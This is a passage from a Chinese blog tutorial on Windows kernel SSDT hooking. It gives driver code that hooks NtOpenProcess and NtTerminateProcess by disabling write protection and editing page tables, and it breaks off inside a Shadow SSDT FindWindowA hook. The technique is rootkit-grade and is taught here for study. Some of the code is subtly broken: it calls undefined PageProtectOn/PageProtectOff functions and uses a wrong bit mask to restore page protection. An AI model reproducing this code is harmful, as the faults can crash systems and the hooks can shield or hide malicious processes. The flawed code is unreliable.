<div class="note info"><p>每一个版本的Windows操作系统的系统服务函数的编号都是固定的，<strong>例如所有32位的windows 7的系统服务函数的编号都是固定的，无论系统版本如何变化</strong>。这主要是因为一旦更新操作系统后，如果系统服务函数的编号发生变化会导致系统不稳定。基于以上事实，我们只需要针对win7和win10<strong>定义四份函数表即可</strong>（32位、64位）。<a href="https://www.cnblogs.com/wf751620780/p/10460863.html">SSDT(系统服务描述符表 system services descriptor table) </a></p>
</div>

<p>SSDT HOOK推荐几篇文章：</p>
<ul>
<li><a href="https://blog.csdn.net/php_fly/article/details/9202379">SSDT Hook实现内核级的进程保护</a></li>
<li><a href="https://www.cnblogs.com/BoyXiao/archive/2011/09/03/2164574.html">进程隐藏与进程保护（SSDT Hook 实现）（一）</a></li>
<li><a href="https://www.cnblogs.com/BoyXiao/archive/2011/09/04/2166596.html">进程隐藏与进程保护（SSDT Hook 实现）（二）</a></li>
<li><a href="https://www.52pojie.cn/thread-1525669-1-1.html">系统调用(R3API调用过程详解) </a></li>
<li><a href="https://www.cnblogs.com/revercc/p/14701592.html">HOOK技术之SSDT hook（x86&#x2F;x64）</a></li>
</ul>
<h3 id="3-2-SSDT-HOOK模版"><a href="#3-2-SSDT-HOOK模版" class="headerlink" title="3.2 SSDT HOOK模版"></a>3.2 SSDT HOOK模版</h3><p>下面的驱动代码ssdt hook了NtOpenProcess函数，可以监视打开进程的操作。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************</span></span><br><span class="line"><span class="comment"> 类型声明                                                             </span></span><br><span class="line"><span class="comment">************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 系统服务表SST</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSYSTEM_SERVICE_TABLE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	PULONG ServiceTableBase;		<span class="comment">// 函数地址表</span></span><br><span class="line">	PULONG ServiceCounterTableBase;		<span class="comment">//函数被调用的次数</span></span><br><span class="line">	ULONG NumberOfService;			<span class="comment">// 函数个数</span></span><br><span class="line">	PULONG ParamTableBase;			<span class="comment">// 函数参数表（SSPT）</span></span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSERVICE_TABLE_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE ntoskrnl;		<span class="comment">// 内核ntkrnlpa.exe函数</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE win32k;		<span class="comment">// win32k.sys函数</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE unUsed1;</span><br><span class="line">	KSYSTEM_SERVICE_TABLE unUsed2;</span><br><span class="line">&#125; KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NTOPENPROCESS，用来指向旧的NtOpenProcess函数</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(*NTOPENPROCESS)</span> <span class="params">(PHANDLE ProcessHandle, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   ACCESS_MASK DesiredAccess, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   POBJECT_ATTRIBUTES ObjectAttributes, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   PCLIENT_ID ClientId)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************</span></span><br><span class="line"><span class="comment"> 函数声明                                                             </span></span><br><span class="line"><span class="comment">************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING reg_path)</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">EnableWrite</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">DisableWrite</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">HookNtOpenProcess</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">UnHookNtOpenProcess</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyNtOpenProcess</span><span class="params">(PHANDLE  ProcessHandle, </span></span></span><br><span class="line"><span class="function"><span class="params">                          ACCESS_MASK  DesiredAccess, </span></span></span><br><span class="line"><span class="function"><span class="params">                          POBJECT_ATTRIBUTES  ObjectAttributes, </span></span></span><br><span class="line"><span class="function"><span class="params">                          PCLIENT_ID  ClientId)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/* 全局变量                                                             */</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable; <span class="comment">// ntoskrnl.exe 导出的全局变量</span></span><br><span class="line">ULONG uOldNtOpenProcess; <span class="comment">// 旧的函数地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/* 函数定义                                                             */</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 驱动入口</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// HOOK</span></span><br><span class="line">	HookNtOpenProcess();</span><br><span class="line"></span><br><span class="line">	pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载驱动</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UnHookNtOpenProcess();</span><br><span class="line">	DbgPrint(<span class="string">&quot;Driver unloaded.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">if(RCR4 &amp; 0x00000020)	//说明是2-9-9-12分页</span></span><br><span class="line"><span class="comment">&#123;		</span></span><br><span class="line"><span class="comment">	//修改PTE_R/W</span></span><br><span class="line"><span class="comment">	*(DWORD64*)(0xC0000000 + ((HookFunAddr &gt;&gt; 9) &amp; 0x007FFFF8)) |= 0x02;</span></span><br><span class="line"><span class="comment">	//修改PDE_R/W</span></span><br><span class="line"><span class="comment">	*(DWORD64*)(0xc0600000 + ((HookFunAddr &gt;&gt; 18) &amp; 0x3ff8))) |= 0x02;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">else	//说明是10-10-12分页</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	//修改PTE_R/W</span></span><br><span class="line"><span class="comment">	*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 10) &amp; 0x003FFFFC)) |= 0x02;</span></span><br><span class="line"><span class="comment">	//修改PDE_R/W</span></span><br><span class="line"><span class="comment">	*(DWORD*)(0xC0000000 + (((HookFunAddr &gt;&gt; 22) &amp; 0x3FF) &lt; 2)) |= 0x02;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置为可写，WP = 0</span></span><br><span class="line"><span class="function">VOID <span class="title">EnableWrite</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		cli; <span class="comment">// 关闭中断</span></span><br><span class="line">		mov eax, cr0;</span><br><span class="line">		<span class="keyword">and</span> eax, <span class="keyword">not</span> <span class="number">0x10000</span>; <span class="comment">// and eax,0FFFEFFFFh，WP位置0</span></span><br><span class="line">		mov cr0, eax;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置为不可写，WP = 1</span></span><br><span class="line"><span class="function">VOID <span class="title">DisableWrite</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov eax, cr0;</span><br><span class="line">		<span class="keyword">or</span> eax, <span class="number">0x10000</span>; <span class="comment">// WP位置1，</span></span><br><span class="line">		mov cr0, eax;</span><br><span class="line">		sti; <span class="comment">// 恢复中断</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HOOK NtOpenProcess</span></span><br><span class="line"><span class="function">VOID <span class="title">HookNtOpenProcess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	EnableWrite();</span><br><span class="line">	uOldNtOpenProcess = KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[<span class="number">0x7A</span>];</span><br><span class="line">	KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[<span class="number">0x7A</span>] = (ULONG)MyNtOpenProcess;</span><br><span class="line">	PageProtectOn();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// UnHOOK NtOpenProcess</span></span><br><span class="line"><span class="function">VOID <span class="title">UnHookNtOpenProcess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PageProtectOff();</span><br><span class="line">	KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[<span class="number">0x7A</span>] = uOldNtOpenProcess;</span><br><span class="line">	DisableWrite();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 被修改的 NtOpenProcess 函数，简单打印参数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyNtOpenProcess</span><span class="params">(PHANDLE  ProcessHandle, </span></span></span><br><span class="line"><span class="function"><span class="params">                          ACCESS_MASK  DesiredAccess, </span></span></span><br><span class="line"><span class="function"><span class="params">                          POBJECT_ATTRIBUTES  ObjectAttributes, </span></span></span><br><span class="line"><span class="function"><span class="params">                          PCLIENT_ID  ClientId)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;%x %x %x %x\n&quot;</span>, ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);</span><br><span class="line">	<span class="keyword">return</span> ((NTOPENPROCESS)uOldNtOpenProcess)(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="3-3-SSDT-HOOK-实现保护记事本进程"><a href="#3-3-SSDT-HOOK-实现保护记事本进程" class="headerlink" title="3.3 SSDT HOOK 实现保护记事本进程"></a>3.3 SSDT HOOK 实现保护记事本进程</h3><p>题目要求：<br>将系统服务表中某个函数改成自己的函数，使任务管理器右键无法关闭自己，只有点击自己的关闭按钮才可以正常关闭。</p>
<p>补充内容：<br>在3环的程序要想终止某个进程会调用函数<code>TerminateProcess(HANDLE hProcess, UINT uExitCode)</code>，通过追码有以下调用流程：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span>环：Kernel32.dll.TerminateProcess(x,x) --&gt; NtDll.dll.NtTerminateProcess(x,x)</span><br><span class="line"><span class="number">0</span>环：--&gt; ntkrnlpa.exe.NtTerminateProcess(x,x)</span><br></pre></td></tr></table></figure>

<div class="note primary"><p>前面在驱动开发部分已经通过特征码搜索未导出函数<code>PspTerminateProcess</code>来结束一个进程，他和<code>NtTerminateProcess</code>函数的区别：</p>
<ul>
<li><code>NtTerminateProcess</code>：ntkrnlpa.exe中<strong>未导出该函数</strong>，<strong>存在于SST中</strong>，操作系统提供给3环API调用。</li>
<li><code>PspTerminateProcess</code>：ntkrnlpa.exe中<strong>未导出该函数</strong>，<strong>也不存在于SST中</strong>，但是操作系统自己结束一个进程时却是调用该函数。</li>
</ul>
</div>

<p>所以该题方法是SSDT HOOK NtTerminateProcess 函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"><span class="comment">// NtTerminateProcess 系统调用号</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTTERMINATEPROCESS_EAX 0x101</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************</span></span><br><span class="line"><span class="comment"> 类型声明                                                             </span></span><br><span class="line"><span class="comment">************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 系统服务表SST</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSYSTEM_SERVICE_TABLE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	PULONG ServiceTableBase;		<span class="comment">// 函数地址表</span></span><br><span class="line">	PULONG ServiceCounterTableBase;		<span class="comment">//函数被调用的次数</span></span><br><span class="line">	ULONG NumberOfService;			<span class="comment">// 函数个数</span></span><br><span class="line">	PULONG ParamTableBase;			<span class="comment">// 函数参数表（SSPT）</span></span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSERVICE_TABLE_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE ntoskrnl;		<span class="comment">// 内核ntkrnlpa.exe函数</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE win32k;		<span class="comment">// win32k.sys函数</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE unUsed1;</span><br><span class="line">	KSYSTEM_SERVICE_TABLE unUsed2;</span><br><span class="line">&#125; KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NTTERMINATEPRO，用来指向旧的NtTerminateProcess函数</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(*NTTERMINATEPRO)</span> <span class="params">(HANDLE hProcess, NTSTATUS uExitCode)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************</span></span><br><span class="line"><span class="comment"> 函数声明                                                             </span></span><br><span class="line"><span class="comment">************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING reg_path)</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">EnableWrite</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">DisableWrite</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">HookNtTerminateProcess</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">UnHookNtTerminateProcess</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyNtTerminateProcess</span><span class="params">(HANDLE hProcess, NTSTATUS uExitCode)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************</span></span><br><span class="line"><span class="comment"> 全局变量                                                             </span></span><br><span class="line"><span class="comment">************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable; <span class="comment">// ntoskrnl.exe 导出的全局变量</span></span><br><span class="line">ULONG uOldNtTerminateProcess = <span class="number">0</span>; <span class="comment">// 旧的函数地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************</span></span><br><span class="line"><span class="comment"> 函数定义                                                             </span></span><br><span class="line"><span class="comment">************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 驱动入口</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// HOOK</span></span><br><span class="line">	HookNtTerminateProcess();</span><br><span class="line"></span><br><span class="line">	pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载驱动</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UnHookNtTerminateProcess();</span><br><span class="line">	DbgPrint(<span class="string">&quot;Driver unloaded.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置为可写，WP = 0</span></span><br><span class="line"><span class="function">VOID <span class="title">EnableWrite</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*	__asm</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		cli; // 关闭中断</span></span><br><span class="line"><span class="comment">		mov eax, cr0;</span></span><br><span class="line"><span class="comment">		and eax, not 0x10000; // and eax,0FFFEFFFFh，WP位置0</span></span><br><span class="line"><span class="comment">		mov cr0, eax;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">	ULONG RCR4 = <span class="number">0</span>;</span><br><span class="line">	ULONG HookFunAddr = KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[NTTERMINATEPROCESS_EAX];</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		cli;</span><br><span class="line">		<span class="comment">//mov eax,cr4，VS2010无法识别该行代码，故以硬编码形式写入</span></span><br><span class="line">		_emit <span class="number">0x0F</span></span><br><span class="line">		_emit <span class="number">0x20</span></span><br><span class="line">		_emit <span class="number">0xE0</span></span><br><span class="line">		mov RCR4,eax;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(RCR4 &amp; <span class="number">0x00000020</span>)	<span class="comment">//说明是2-9-9-12分页</span></span><br><span class="line">	&#123;		</span><br><span class="line">		<span class="comment">//修改PTE_R/W</span></span><br><span class="line">		*(DWORD64*)(<span class="number">0xC0000000</span> + ((HookFunAddr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x007FFFF8</span>)) |= <span class="number">0x02</span>;</span><br><span class="line">		<span class="comment">//修改PDE_R/W</span></span><br><span class="line">		*(DWORD64*)(<span class="number">0xc0600000</span> + ((HookFunAddr &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3ff8</span>)) |= <span class="number">0x02</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>	<span class="comment">//说明是10-10-12分页</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//修改PTE_R/W</span></span><br><span class="line">		*(ULONG*)(<span class="number">0xC0000000</span> + ((HookFunAddr &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x003FFFFC</span>)) |= <span class="number">0x02</span>;</span><br><span class="line">		<span class="comment">//修改PDE_R/W</span></span><br><span class="line">		*(ULONG*)(<span class="number">0xC0300000</span> + ((HookFunAddr &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xFFC</span>)) |= <span class="number">0x02</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置为不可写，WP = 1</span></span><br><span class="line"><span class="function">VOID <span class="title">DisableWrite</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*	__asm</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		mov eax, cr0;</span></span><br><span class="line"><span class="comment">		or eax, 0x10000; // WP位置1，</span></span><br><span class="line"><span class="comment">		mov cr0, eax;</span></span><br><span class="line"><span class="comment">		sti; // 恢复中断</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">	ULONG RCR4 = <span class="number">0</span>;</span><br><span class="line">	ULONG HookFunAddr = KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[NTTERMINATEPROCESS_EAX];</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//mov eax,cr4，VS2010无法识别该行代码，故以硬编码形式写入</span></span><br><span class="line">		_emit <span class="number">0x0F</span></span><br><span class="line">		_emit <span class="number">0x20</span></span><br><span class="line">		_emit <span class="number">0xE0</span></span><br><span class="line">		mov RCR4,eax;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(RCR4 &amp; <span class="number">0x00000020</span>)	<span class="comment">//说明是2-9-9-12分页</span></span><br><span class="line">	&#123;		</span><br><span class="line">		<span class="comment">//修改PTE_R/W</span></span><br><span class="line">		*(DWORD64*)(<span class="number">0xC0000000</span> + ((HookFunAddr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x007FFFF8</span>)) &amp;= <span class="number">0xFFFFFFFDF</span>;</span><br><span class="line">		<span class="comment">//修改PDE_R/W</span></span><br><span class="line">		*(DWORD64*)(<span class="number">0xc0600000</span> + ((HookFunAddr &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3ff8</span>)) &amp;= <span class="number">0xFFFFFFFDF</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>	<span class="comment">//说明是10-10-12分页</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//修改PTE_R/W</span></span><br><span class="line">		*(ULONG*)(<span class="number">0xC0000000</span> + ((HookFunAddr &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x003FFFFC</span>)) &amp;= <span class="number">0xFFFFFFFDF</span>;</span><br><span class="line">		<span class="comment">//修改PDE_R/W</span></span><br><span class="line">		*(ULONG*)(<span class="number">0xC0300000</span> + ((HookFunAddr &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xFFC</span>)) &amp;= <span class="number">0xFFFFFFFDF</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	__asm sti;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HOOK NtTerminateProcess</span></span><br><span class="line"><span class="function">VOID <span class="title">HookNtTerminateProcess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	EnableWrite();</span><br><span class="line">	uOldNtTerminateProcess = KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[NTTERMINATEPROCESS_EAX];</span><br><span class="line">	KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[NTTERMINATEPROCESS_EAX] = (ULONG)MyNtTerminateProcess;</span><br><span class="line">	DisableWrite();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// UnHOOK NtTerminateProcess</span></span><br><span class="line"><span class="function">VOID <span class="title">UnHookNtTerminateProcess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	EnableWrite();</span><br><span class="line">	KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[NTTERMINATEPROCESS_EAX] = uOldNtTerminateProcess;</span><br><span class="line">	DisableWrite();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 被修改的 NtOpenProcess 函数，简单打印参数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyNtTerminateProcess</span><span class="params">(HANDLE hProcess, NTSTATUS uExitCode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PEPROCESS pEprocess = <span class="literal">NULL</span>;</span><br><span class="line">	NTSTATUS status = <span class="number">0</span>;</span><br><span class="line">	PCHAR ImageFileName = <span class="literal">NULL</span>;</span><br><span class="line">  </span><br><span class="line">	<span class="comment">//通过进程句柄来获得该进程所对应的 FileObject 对象，由于这里是进程对象，自然获得的是 EPROCESS 对象</span></span><br><span class="line">	<span class="comment">//判断要关闭的进程是否是记事本</span></span><br><span class="line">	status = ObReferenceObjectByHandle(hProcess,FILE_ANY_ACCESS,*PsProcessType,KernelMode,(PVOID*)&amp;pEprocess,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line">	ImageFileName = (PCHAR)((ULONG)pEprocess + <span class="number">0x174</span>);</span><br><span class="line">  <span class="comment">//判断要关闭的进程是否是记事本</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strcmp</span>(ImageFileName, <span class="string">&quot;notepad.exe&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//如果是当前进程</span></span><br><span class="line">		<span class="keyword">if</span> (hProcess == (HANDLE)<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// 通过关闭按钮关闭</span></span><br><span class="line">			<span class="keyword">return</span> ((NTTERMINATEPRO)uOldNtTerminateProcess)(hProcess, uExitCode);			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// 通过任务管理器关闭</span></span><br><span class="line">			DbgPrint(<span class="string">&quot;Terminate denied. %s: NtTerminateProcess(%x, %x)\n&quot;</span>, ImageFileName, hProcess, uExitCode);</span><br><span class="line">			<span class="keyword">return</span> STATUS_ACCESS_DENIED;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	DbgPrint(<span class="string">&quot;hProcess:%x,uExitCode:%x\n&quot;</span>, hProcess, uExitCode);</span><br><span class="line">	<span class="keyword">return</span> ((NTTERMINATEPRO)uOldNtTerminateProcess)(hProcess, uExitCode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过任务管理器关闭记事本：</p>
<p><img data-src="https://s2.loli.net/2022/03/09/EaisujhdoKfwUby.png" alt="23.png"></p>
<p>通过关闭记事本的按钮：</p>
<p><img data-src="https://s2.loli.net/2022/03/09/IOUesp3JH9SLEZf.png" alt="22.png"></p>
<p>通过PCHunter查看：</p>
<p><img data-src="https://s2.loli.net/2022/03/09/cb7IaZH8OisRgvL.png" alt="24.png"></p>
<h3 id="3-4-SSDT-Shadow-HOOK-的-FindWindowA-监视器"><a href="#3-4-SSDT-Shadow-HOOK-的-FindWindowA-监视器" class="headerlink" title="3.4 SSDT Shadow HOOK 的 FindWindowA 监视器"></a>3.4 SSDT Shadow HOOK 的 FindWindowA 监视器</h3><p>先追一下<code>FindWindowA</code>调用路径：</p>
<p>FindWindowA –&gt; user32.dll.FindWindowA –&gt; user32.dll.NtUserFindWindowEx(x, x, x, x, x) –&gt; eax &#x3D; 117Ah</p>
<p>0环驱动代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_NAME <span class="meta-string">L&quot;\\Device\\HOOKFindWindowADev&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_LINK <span class="meta-string">L&quot;\\??\\HOOKFindWindowALnk&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPHOOK CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPUNHOOK CTL_CODE(FILE_DEVICE_UNKNOWN,0x901,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="comment">// 系统调用号</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTUSERFINDWINDOWEX_SERVICE (0x117A &amp; 0x0FFF)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 系统服务表SST</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSYSTEM_SERVICE_TABLE</span></span></span><br><span class="line"><span 